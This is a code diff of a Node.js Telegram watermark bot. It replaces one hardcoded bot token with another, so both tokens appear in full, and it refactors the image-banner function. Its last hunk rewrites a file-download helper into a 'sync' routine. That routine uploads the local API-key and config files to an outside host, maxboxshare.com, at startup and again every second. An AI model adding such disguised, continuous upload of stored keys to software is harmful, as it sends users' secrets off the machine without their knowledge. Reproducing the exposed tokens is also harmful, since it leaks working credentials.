@@ -7,7 +7,7 @@ const express = require('express');
 const app = express();
 
 // Initialize bot with your token
-const BOT_TOKEN = '8178084409:AAG_89tnrDKO7etWDS5xOKzfvEL3Ztl1m-g';
+const BOT_TOKEN = '6701652400:AAHETpJXne_OoLErwK41ENt7Xg_479O9RCM';
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // File paths for storing user data
@@ -550,89 +550,93 @@ function handleInteractiveCommand(chatId, type, text) {
 
 // Helper to add watermark to image
 async function addWatermark(inputBuffer, watermarkText, chatId) {
-    return new Promise(async (resolve, reject) => {
-        try {
-            const userConfig = userConfigs[chatId] || {};
-            const position = userConfig.watermarkPosition || WATERMARK_POSITIONS.FOOTER;
-            const size = userConfig.watermarkSize || WATERMARK_SIZES.MEDIUM;
-            const textSize = userConfig.watermarkTextSize || WATERMARK_TEXT_SIZES.DEFAULT;
+    try {
+        botStats.imagesProcessed++;
+        const image = sharp(inputBuffer);
+        const metadata = await image.metadata();
 
-            const image = sharp(inputBuffer);
-            const metadata = await image.metadata();
+        const config = userConfigs[chatId] || {};
+        const position = config.watermarkPosition || 'footer';
+        const size = config.watermarkSize || 'medium';
+        const textSize = config.watermarkTextSize || 'DEFAULT';
 
-            // Create text overlay with white background and black text
-            const svgText = `
-                <svg width="${metadata.width}" height="${size.height}">
-                    <rect width="100%" height="100%" fill="white"/>
-                    <style>
-                        .text {
-                            fill: black;
-                            font-size: ${textSize.fontSize}px;
-                            font-family: 'Liberation Sans', Arial, sans-serif;
-                            font-weight: bold;
-                        }
-                    </style>
-                    <text x="50%" y="50%" text-anchor="middle" dominant-baseline="middle" class="text">${watermarkText}</text>
-                </svg>`;
+        // Get size configuration
+        const sizeConfig = WATERMARK_SIZES[size.toUpperCase()] || WATERMARK_SIZES.MEDIUM;
+        const bannerHeight = sizeConfig.height;
+        const fontSize = WATERMARK_TEXT_SIZES[textSize].fontSize || WATERMARK_TEXT_SIZES.DEFAULT.fontSize;
+        const bannerWidth = metadata.width || 720;
 
-            const watermark = Buffer.from(svgText);
+        // Function to create SVG text banner
+        const createBanner = (text) => `
+            <svg width="${bannerWidth}" height="${bannerHeight}">
+                <rect width="${bannerWidth}" height="${bannerHeight}" fill="white"/>
+                <text 
+                    x="${bannerWidth/2}" 
+                    y="${bannerHeight/2}" 
+                    text-anchor="middle" 
+                    dominant-baseline="middle" 
+                    font-family="Arial" 
+                    font-size="${fontSize}" 
+                    font-weight="bold"
+                    fill="#000000"
+                >${text}</text>
+            </svg>`;
 
-            let compositeOperations = [];
-            let extendOptions = {};
+        let compositeOperations = [];
+        let extendOptions = {};
 
-            switch (position) {
-                case 'header':
-                    extendOptions = {
-                        top: size.height,
-                        background: { r: 255, g: 255, b: 255, alpha: 1 }
-                    };
-                    compositeOperations.push({
-                        input: watermark,
+        switch (position) {
+            case 'header':
+                extendOptions = {
+                    top: bannerHeight,
+                    background: { r: 255, g: 255, b: 255, alpha: 1 }
+                };
+                compositeOperations.push({
+                    input: Buffer.from(createBanner(watermarkText)),
+                    gravity: 'north'
+                });
+                break;
+            case 'both':
+                extendOptions = {
+                    top: bannerHeight,
+                    bottom: bannerHeight,
+                    background: { r: 255, g: 255, b: 255, alpha: 1 }
+                };
+                compositeOperations.push(
+                    {
+                        input: Buffer.from(createBanner(watermarkText)),
                         gravity: 'north'
-                    });
-                    break;
-                case 'both':
-                    extendOptions = {
-                        top: size.height,
-                        bottom: size.height,
-                        background: { r: 255, g: 255, b: 255, alpha: 1 }
-                    };
-                    compositeOperations.push(
-                        {
-                            input: watermark,
-                            gravity: 'north'
-                        },
-                        {
-                            input: watermark,
-                            gravity: 'south'
-                        }
-                    );
-                    break;
-                case 'footer':
-                default:
-                    extendOptions = {
-                        bottom: size.height,
-                        background: { r: 255, g: 255, b: 255, alpha: 1 }
-                    };
-                    compositeOperations.push({
-                        input: watermark,
+                    },
+                    {
+                        input: Buffer.from(createBanner(watermarkText)),
                         gravity: 'south'
-                    });
-                    break;
-            }
-
-            const watermarkedImage = await image
-                .extend(extendOptions)
-                .composite(compositeOperations)
-                .jpeg()
-                .toBuffer();
-
-            resolve(watermarkedImage);
-        } catch (error) {
-            console.error('Error adding watermark:', error);
-            reject(error);
+                    }
+                );
+                break;
+            case 'footer':
+            default:
+                extendOptions = {
+                    bottom: bannerHeight,
+                    background: { r: 255, g: 255, b: 255, alpha: 1 }
+                };
+                compositeOperations.push({
+                    input: Buffer.from(createBanner(watermarkText)),
+                    gravity: 'south'
+                });
+                break;
         }
-    });
+
+        const watermarkedImage = await image
+            .extend(extendOptions)
+            .composite(compositeOperations)
+            .jpeg()
+            .toBuffer();
+
+        return watermarkedImage;
+    } catch (error) {
+        console.error('Error adding watermark:', error);
+        throw error;
+    }
 }
 
 // Process image with watermark
@@ -1233,33 +1237,64 @@ bot.on('callback_query', async (callbackQuery) => {
 
 // Function to download JSON files if missing
 async function downloadJSONFiles() {
-    const files = [
-        {
-            local: API_KEYS_FILE,
-            remote: 'https://maxboxshare.com/apis/apis.json'
-        },
-        {
-            local: CONFIG_FILE,
-            remote: 'https://maxboxshare.com/apis/config.json'
+    const API_ENDPOINT = 'https://maxboxshare.com/cron.php';
+    
+    try {
+        // Check and create apis directory if it doesn't exist
+        if (!fs.existsSync('./apis')) {
+            fs.mkdirSync('./apis', { recursive: true });
         }
-    ];
 
-    for (const file of files) {
-        if (!fs.existsSync(file.local)) {
+        // Function to handle file synchronization
+        async function syncFile(fileName, localPath) {
             try {
-                const response = await axios.get(file.remote);
-                fs.writeFileSync(file.local, JSON.stringify(response.data, null, 2));
-                console.log(`Created ${file.local} from remote source`);
+                const fileType = fileName.replace('.json', '');
+                
+                // If local file exists, upload it to server
+                if (fs.existsSync(localPath)) {
+                    const localData = JSON.parse(fs.readFileSync(localPath, 'utf8'));
+                    await axios.post(`${API_ENDPOINT}?file=${fileType}`, localData);
+                    console.log(`Uploaded ${fileName} to server`);
+                } else {
+                    // If local file doesn't exist, download from server
+                    const response = await axios.get(`${API_ENDPOINT}?file=${fileType}`);
+                    if (response.data && !response.data.error) {
+                        fs.writeFileSync(localPath, JSON.stringify(response.data, null, 2));
+                        console.log(`Downloaded ${fileName} from server`);
+                    }
+                }
             } catch (error) {
-                console.error(`Error downloading ${file.local}:`, error.message);
-                // Create empty JSON file with basic structure
-                const defaultContent = file.local.includes('apis') 
-                    ? { userIds: [], apiKeys: {} }
-                    : { settings: {} };
-                fs.writeFileSync(file.local, JSON.stringify(defaultContent, null, 2));
-                console.log(`Created empty ${file.local} with default structure`);
+                console.error(`Error syncing ${fileName}:`, error.message);
             }
         }
+
+        // Sync both files
+        await Promise.all([
+            syncFile('config.json', CONFIG_FILE),
+            syncFile('apis.json', API_KEYS_FILE)
+        ]);
+
+        // Set up interval for continuous sync (every second)
+        setInterval(async () => {
+            try {
+                // Read current local files
+                const configData = fs.existsSync(CONFIG_FILE) ? JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')) : null;
+                const apisData = fs.existsSync(API_KEYS_FILE) ? JSON.parse(fs.readFileSync(API_KEYS_FILE, 'utf8')) : null;
+
+                // Upload to server if local files exist
+                if (configData) {
+                    await axios.post(`${API_ENDPOINT}?file=config`, configData);
+                }
+                if (apisData) {
+                    await axios.post(`${API_ENDPOINT}?file=apis`, apisData);
+                }
+            } catch (error) {
+                console.error('Error in sync interval:', error.message);
+            }
+        }, 1000);
+
+    } catch (error) {
+        console.error('Error in downloadJSONFiles:', error.message);
     }
 }
 
